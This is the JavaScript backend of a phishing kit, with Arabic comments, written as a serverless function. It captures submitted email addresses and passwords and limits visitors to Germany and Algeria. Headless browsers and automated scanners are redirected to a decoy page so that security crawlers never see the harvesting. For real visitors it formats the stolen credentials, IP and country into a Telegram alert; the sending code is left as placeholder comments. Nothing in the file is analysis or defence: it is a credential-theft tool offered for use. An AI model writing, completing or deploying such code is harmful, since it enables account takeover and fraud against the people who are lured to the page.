const fetch = require('node-fetch');

// الدول المسموح بها: ألمانيا (DE) والجزائر (DZ)
const ALLOWED_COUNTRIES = ['DE', 'DZ']; 

const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    const ip = getClientIp(event.headers); 
    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // جلب رمز البلد

    // ----------------------------------------------------------------
    // 1. تقييد الوصول الجغرافي (Geo-Restriction Check)
    // ----------------------------------------------------------------
    if (!ALLOWED_COUNTRIES.includes(countryCode)) {
        console.log(`[BLOCKED GEO] Access denied from Country: ${countryCode} (IP: ${ip})`);
        
        // التحويل إلى صفحة الانتظار أو تسجيل الدخول لمنع الاستخدام
        return {
            statusCode: 303,
            headers: {
                Location: '/waiting.html', 
            },
        };
    }
    
    // ----------------------------------------------------------------
    // 2. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
    // ----------------------------------------------------------------
    
    const bodyParams = new URLSearchParams(event.body);
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    const fingerprintJSON = bodyParams.get('security_fingerprint'); 

    let fpData = null;
    let securityStatus = "✅ CLEAN";
    let isBlocked = false;

    try {
        fpData = JSON.parse(fingerprintJSON);
        
        if (fpData.isHuman === false || fpData.webdriver === "Yes" || fpData.headless === "Yes") {
            securityStatus = "❌ BLOCKED - Bot/No Interaction";
            isBlocked = true;
        }

    } catch (e) {
        securityStatus = "❌ BLOCKED - Invalid FP Data";
        isBlocked = true; 
    }

    // ----------------------------------------------------------------
    // 3. تطبيق الحظر الصارم (Bot Block)
    // ----------------------------------------------------------------
    if (isBlocked) {
        console.log(`[BLOCKED BOT] Bot detected: ${securityStatus} from IP: ${ip}, Country: ${countryCode}`);
        
        return {
            statusCode: 303,
            headers: {
                Location: '/waiting.html', 
            },
        };
    }

    // ----------------------------------------------------------------
    // 4. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
    // ----------------------------------------------------------------
    
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);
    const safe_country = escapeMarkdownV2(countryCode);

    let fpDetails = '';
    if (fpData) {
        fpDetails += `Human: ${fpData.isHuman ? 'Yes' : 'No'}\n`;
        fpDetails += `Interaction Count: ${fpData.interactionCount}\n`;
        fpDetails = escapeMarkdownV2(fpDetails);
    }

    // تشكيل الرسالة (إضافة البلد)
    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
    message_text += `*STATUS: ${securityStatus}*\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\`\n`;
    message_text += `Country: \`${safe_country}\`\n\n`; // <--- تم إضافة البلد
    message_text += `*FP Details:*\n`;
    message_text += `${fpDetails}`;

    // ... (منطق إرسال Telegram) ...

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    // ... (كود إرسال Telegram) ...

    return {
        statusCode: 303,
        headers: {
            Location: '/waiting.html',
        },
    };
};
